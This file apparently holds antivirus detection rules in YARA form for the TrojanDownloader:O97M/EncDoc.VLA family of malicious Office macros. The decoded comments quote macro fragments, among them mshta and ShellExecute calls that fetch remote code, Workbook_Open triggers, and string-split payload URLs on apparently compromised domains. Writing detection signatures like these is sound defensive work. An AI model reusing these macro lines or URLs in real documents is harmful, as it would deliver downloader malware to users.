
rule TrojanDownloader_O97M_EncDoc_VLA_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VLA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {53 68 65 6c 6c 20 22 6d 73 68 74 61 20 68 74 74 70 73 3a 2f 2f 62 69 74 2e 6c 79 2f 61 73 64 71 77 64 71 77 6f 6a 64 61 73 6d 6e 64 62 61 73 22 } //1 Shell "mshta https://bit.ly/asdqwdqwojdasmndbas"
		$a_01_1 = {53 75 62 20 61 73 6b 64 6a 61 6c 73 64 28 29 } //1 Sub askdjalsd()
		$a_01_2 = {56 42 5f 42 61 73 65 20 3d 20 22 30 7b 30 30 30 32 30 38 31 39 2d 30 30 30 30 2d 30 30 30 30 2d 43 30 30 30 2d 30 30 30 30 30 30 30 30 30 30 34 36 7d } //1 VB_Base = "0{00020819-0000-0000-C000-000000000046}
		$a_01_3 = {50 72 69 76 61 74 65 20 53 75 62 20 57 6f 72 6b 62 6f 6f 6b 5f 4f 70 65 6e 28 29 } //1 Private Sub Workbook_Open()
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_EncDoc_VLA_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VLA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {63 3a 5c 77 69 6e 64 6f 77 73 5c 73 79 73 74 65 6d 33 32 5c 63 61 6c 63 5c 2e 2e 5c 63 6f 6e 68 6f 73 74 2e 65 78 65 20 6d 73 68 74 61 20 68 74 74 70 3a 2f 2f 6a 2e 6d 70 2f } //1 c:\windows\system32\calc\..\conhost.exe mshta http://j.mp/
		$a_01_1 = {61 73 6b 73 64 64 61 70 6f 6f 70 62 6e 6e 62 6e 62 74 79 71 77 6b 64 } //1 asksddapoopbnnbnbtyqwkd
		$a_01_2 = {56 42 41 2e 47 65 74 4f 62 6a 65 63 74 28 22 6e 65 77 3a 31 33 37 30 39 36 32 30 2d 43 32 37 39 2d 31 31 43 45 2d 41 34 39 45 2d 34 34 34 35 35 33 35 34 30 30 30 30 22 29 2e 53 68 65 6c 6c 65 78 65 63 75 74 65 } //1 VBA.GetObject("new:13709620-C279-11CE-A49E-444553540000").Shellexecute
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_EncDoc_VLA_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VLA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 03 00 00 "
		
	strings :
		$a_01_0 = {68 22 26 22 74 74 70 73 3a 2f 2f 72 22 26 22 65 63 61 70 69 74 6f 6c 2e 63 6f 6d 2f 74 6c 36 69 6c 4b 59 31 74 38 72 2f 72 65 70 6f 2e 68 22 26 22 74 6d 6c } //1 h"&"ttps://r"&"ecapitol.com/tl6ilKY1t8r/repo.h"&"tml
		$a_01_1 = {68 22 26 22 74 22 26 22 74 70 73 3a 2f 2f 73 22 26 22 77 65 65 62 65 7a 2e 63 6f 6d 2f 51 48 61 48 65 43 6e 52 72 56 2f 72 65 70 6f 2e 68 22 26 22 74 6d 6c } //1 h"&"t"&"tps://s"&"weebez.com/QHaHeCnRrV/repo.h"&"tml
		$a_01_2 = {68 22 26 22 74 22 26 22 74 70 73 3a 2f 2f 6d 22 26 22 68 6a 6c 61 62 2e 6d 6c 2f 32 65 69 65 31 4a 4e 73 51 42 2f 72 65 70 6f 2e 68 22 26 22 74 6d 6c } //1 h"&"t"&"tps://m"&"hjlab.ml/2eie1JNsQB/repo.h"&"tml
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=1
 
}
rule TrojanDownloader_O97M_EncDoc_VLA_MTB_4{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VLA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {53 68 65 6c 6c 28 22 77 73 63 72 69 70 74 20 22 20 2b 20 22 62 72 6f 77 73 65 72 61 70 70 2e 6a 73 22 2c 20 76 62 4e 6f 72 6d 61 6c 46 6f 63 75 73 29 } //1 Shell("wscript " + "browserapp.js", vbNormalFocus)
		$a_01_1 = {27 4d 73 67 42 6f 78 20 28 22 6a 68 65 67 6a 68 65 67 79 67 75 79 74 72 75 67 69 68 33 66 62 68 79 72 33 68 66 68 75 33 79 72 75 68 66 76 68 62 33 6a 6e 65 66 68 76 33 75 79 65 6a 66 62 76 6a 68 65 69 75 68 65 66 68 76 75 75 33 68 69 65 66 68 76 75 69 68 6a 22 29 } //1 'MsgBox ("jhegjhegyguytrugih3fbhyr3hfhu3yruhfvhb3jnefhv3uyejfbvjheiuhefhvuu3hiefhvuihj")
		$a_01_2 = {57 72 69 74 65 4c 69 6e 65 20 57 6f 72 6b 73 68 65 65 74 73 28 22 53 68 65 65 74 32 22 29 2e 52 61 6e 67 65 28 22 42 4e 38 31 31 22 29 2e 56 61 6c 75 65 } //1 WriteLine Worksheets("Sheet2").Range("BN811").Value
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_EncDoc_VLA_MTB_5{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VLA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 68 65 22 20 2b 20 22 6c 6c 2e 41 70 22 20 2b 20 22 70 6c 69 63 22 20 2b 20 22 61 74 69 6f 6e 22 29 } //1 CreateObject("She" + "ll.Ap" + "plic" + "ation")
		$a_01_1 = {43 61 6c 6c 42 79 4e 61 6d 65 28 69 67 63 58 72 2c 20 22 53 68 22 20 2b 20 22 65 6c 22 20 2b 20 22 6c 45 78 65 22 20 2b 20 22 63 75 74 65 22 2c 20 56 62 4d 65 74 68 6f 64 2c 20 55 52 78 6c 28 30 29 2c 20 55 52 78 6c 28 31 29 2c 20 55 52 78 6c 28 32 29 2c 20 55 52 78 6c 28 33 29 2c 20 55 52 78 6c 28 34 29 29 } //1 CallByName(igcXr, "Sh" + "el" + "lExe" + "cute", VbMethod, URxl(0), URxl(1), URxl(2), URxl(3), URxl(4))
		$a_01_2 = {22 70 69 6e 67 20 67 6f 6f 67 6c 65 2e 63 6f 6d 3b 22 20 2b 20 65 65 65 65 77 } //1 "ping google.com;" + eeeew
		$a_01_3 = {22 70 22 20 2b 20 69 66 67 6b 64 66 67 } //1 "p" + ifgkdfg
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_O97M_EncDoc_VLA_MTB_6{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VLA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 03 00 00 "
		
	strings :
		$a_01_0 = {68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 6f 22 26 22 6e 22 26 22 6c 69 6e 65 22 26 22 79 6f 22 26 22 67 61 63 6f 22 26 22 75 72 73 65 2e 6f 72 67 2f 35 68 67 50 37 6e 35 6e 54 43 2f 61 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22 } //1 h"&"t"&"t"&"ps://o"&"n"&"line"&"yo"&"gaco"&"urse.org/5hgP7n5nTC/a.h"&"t"&"m"&"l"
		$a_01_1 = {68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 72 61 62 22 26 22 65 64 63 2e 63 6f 6d 2f 6d 73 22 26 22 64 63 6c 75 56 38 79 35 6e 66 2f 61 6c 66 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22 } //1 h"&"t"&"t"&"ps://rab"&"edc.com/ms"&"dcluV8y5nf/alf.h"&"t"&"m"&"l"
		$a_01_2 = {68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 70 61 72 22 26 22 74 69 75 76 22 26 22 61 6d 6f 73 22 26 22 76 69 61 6a 61 72 2e 63 6f 6d 2f 78 59 49 4a 54 55 63 47 78 76 46 31 2f 61 6c 66 6f 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c } //1 h"&"t"&"t"&"ps://par"&"tiuv"&"amos"&"viajar.com/xYIJTUcGxvF1/alfo.h"&"t"&"m"&"l
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=1
 
}
rule TrojanDownloader_O97M_EncDoc_VLA_MTB_7{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VLA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 03 00 00 "
		
	strings :
		$a_01_0 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 73 3a 2f 2f 72 22 26 22 65 22 26 22 63 22 26 22 61 70 69 22 26 22 74 6f 6c 2e 63 6f 6d 2f 70 6c 39 32 66 49 22 26 22 65 48 45 31 31 58 2f 66 69 6c 22 26 22 68 74 2e 68 74 22 26 22 6d 6c 22 } //1 "h"&"t"&"t"&"ps://r"&"e"&"c"&"api"&"tol.com/pl92fI"&"eHE11X/fil"&"ht.ht"&"ml"
		$a_01_1 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 73 3a 2f 2f 62 6f 22 26 22 6f 67 22 26 22 69 65 22 26 22 70 22 26 22 72 22 26 22 6f 64 75 63 74 69 22 26 22 6f 6e 73 2e 63 6f 6d 2e 61 75 2f 6a 4a 4e 57 32 4c 44 46 2f 66 69 6c 6b 22 26 22 66 68 74 2e 68 22 26 22 74 6d 6c } //1 "h"&"t"&"t"&"p"&"s://bo"&"og"&"ie"&"p"&"r"&"oducti"&"ons.com.au/jJNW2LDF/filk"&"fht.h"&"tml
		$a_01_2 = {22 68 22 26 22 74 22 26 22 74 70 22 26 22 73 3a 2f 2f 69 22 26 22 75 2e 61 63 2e 62 64 2f 51 70 22 26 22 50 71 22 26 22 35 6c 6d 36 58 79 2f 66 69 6b 22 26 22 66 68 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22 2c 22 } //1 "h"&"t"&"tp"&"s://i"&"u.ac.bd/Qp"&"Pq"&"5lm6Xy/fik"&"fh.h"&"t"&"m"&"l","
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=1
 
}
rule TrojanDownloader_O97M_EncDoc_VLA_MTB_8{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.VLA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 03 00 00 "
		
	strings :
		$a_01_0 = {22 68 22 26 22 74 74 22 26 22 70 73 3a 2f 2f 68 61 22 26 22 6d 7a 22 26 22 61 22 26 22 74 72 61 22 26 22 64 65 22 26 22 72 73 62 6b 72 2e 63 6f 6d 2f 32 39 69 22 26 22 6e 70 22 26 22 43 71 70 6a 59 4b 2f 6c 22 26 22 69 70 61 22 26 22 73 73 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c } //1 "h"&"tt"&"ps://ha"&"mz"&"a"&"tra"&"de"&"rsbkr.com/29i"&"np"&"CqpjYK/l"&"ipa"&"ss.h"&"t"&"m"&"l
		$a_01_1 = {22 68 22 26 22 74 74 22 26 22 70 22 26 22 73 3a 2f 2f 6a 75 64 22 26 22 67 65 22 26 22 32 77 22 26 22 69 6e 2e 63 6f 6d 2f 67 32 41 22 26 22 6a 64 6c 39 22 26 22 4f 4b 2f 6c 69 70 61 73 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c } //1 "h"&"tt"&"p"&"s://jud"&"ge"&"2w"&"in.com/g2A"&"jdl9"&"OK/lipas.h"&"t"&"m"&"l
		$a_01_2 = {22 68 22 26 22 74 74 22 26 22 70 73 3a 2f 2f 72 65 22 26 22 6e 22 26 22 65 72 22 26 22 6f 64 22 26 22 72 69 67 75 65 73 2e 63 6f 6d 2e 62 72 2f 76 4f 67 64 44 4a 44 42 71 64 4a 79 2f 6c 69 70 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c } //1 "h"&"tt"&"ps://re"&"n"&"er"&"od"&"rigues.com.br/vOgdDJDBqdJy/lip.h"&"t"&"m"&"l
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=1
 
}